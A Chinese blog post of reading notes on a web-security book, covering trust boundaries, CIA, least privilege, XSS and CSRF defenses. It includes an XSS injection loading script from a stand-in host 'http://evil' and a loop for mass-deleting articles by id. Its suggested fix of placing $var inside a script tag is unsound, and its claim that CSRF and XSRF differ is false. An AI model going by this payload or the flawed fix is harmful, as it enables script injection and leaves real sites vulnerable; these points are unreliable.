---
layout: post
title: 《白帽子讲Web安全》
category: 读书总结
tags: WEB安全
---

###一、安全问题的本质是信任问题。
互联网安全的核心是数据安全，数据从高等级的信任域流向低等级的信任域，是不需要安全检查的；数据从低等级的信任域流向高等级的信任域，则需要经过信任边界的安全检查。
![网站信任模型]({{ site.url }}/public/blog-img/website-security-model.jpg)


###二、安全三要素(CIA)
机密性：保护数据内容不泄露。加密是实现机密性要求的常见手段。  
完整性：保护数据内容是完整、没有被篡改的。常见的保证一致性的技术手段是数字签名
可用性：保护资源是“随需而得”。  

Ps: CIA的要求在登陆验证的需求下表现的淋漓尽致。使用SSL加密传输保证数据的机密性，使用数字签名保证数据未被篡改，使用其他手段保证不被Dos攻击。

###三、白帽子安全兵法
####1、最小权限原则    
系统只授予主体必要的权限，而不要过度授权。  

Ps: 最直接的体现每种类型的后台App一个独立的账号，数据库、Web app、Daemon app使用独立账号管理，只授予必要权限，限定目录读写等权限。

####2、纵深防御原则：
首先，要在各个不同的层面，不同的方面实施安全方案，避免出现疏漏，不同安全方案之间相互配合，构成一个整体。   
其次，在正确的地方做正确的事，即：在解决根本问题的地方实施针对性的安全方案。

Ps: 如无论Web app、Deamon app都需要互不信任、进行防御，构成纵深；然后针对自身的服务针对性的设计安全方案，如Web app主要针对Web安全，后台服务主要防止数据注入。

####3、数据与代码分离
例如：  

```html
<html>
<head></head>
<body>
$var
</body>
</html>
```
对于这段代码:

````html
<html>
<head></head>
<body>
</body>
</html>
```
就是程序的代码段，而

```html
$var
```
就是用户数据。
当$var的值是：  
<script src="http://evil"></script>
此时就会出现安全问题。    
此时如何处理，根据代码分离的原则，重写程序片段并对$var进行安全处理

```html
<html>
<head></head>
<body>
<script>
$var
</script>
</body>
</html>
```
此时，script还原为代码片段，用户数据只有$var，就可以做安全处理了。

####4、不可预测性
不可预测性能后效的对抗基于篡改、伪造的攻击。  
例如，一个内容管理系统，如果文章的序号是按照数字升序排列，那么如果攻击者如果想批量删除这些文章，只需要简单的一个脚本：

```javascript
for (i=0; i<1000; i++) {
  delete(url+"?id="+i);
}
```

###四、跨站脚本攻击(XSS:cross site script)
####本质：用户数据被当成了HTML代码的一部分执行，从而混淆了原本的语义，产生新的语义

XSS根据效果可以划分为一下几类：
####1、反射型\存储型XSS
原理：从服务器应用直接输出到HTML页面中以进行攻击的XSS漏洞
防御：
输入检查：根据数据的特征进行简单的XSS过滤
输出检查：根据输出的场景进行XSS防御，根据场景的不同选择合适的encode函数。常见的场景包括：HTML标签、HTML属性、script标签、CSS、地址栏、Http Response头。
####2、DOM Based XSS
原理：通过Javascript修改HTML页面的DOM节点时形成的XSS漏洞
防御：在数据输入到Javascript中应该执行一次javascriptEncode，然后同上。即，从Javascript输出到HTML页面也相当于一次XSS输出的过程，需要分场景使用不同的encode函数。

###五、跨站点请求伪造(CSRF:cross site request forgery)
本质：重要操作的所有参数都可以被攻击者猜测到的。
攻击者只有预测出URL的所有参数和参数值，才能成功地构造一个伪造的参数；反之，攻击者将无法攻击成功

防御：anti CSRF Token，保持原参数不变，新增一个参数token，该参数的值是随机的。通过添加此参数，促使攻击者无法预测所有参数值以预防CSRF。   

Ps: 不可预测性

Ps: CSRF与XSRF不同，解决后者的唯一办法首先是解决XSS问题，然后才是CSRF问题。


(未完待续)



---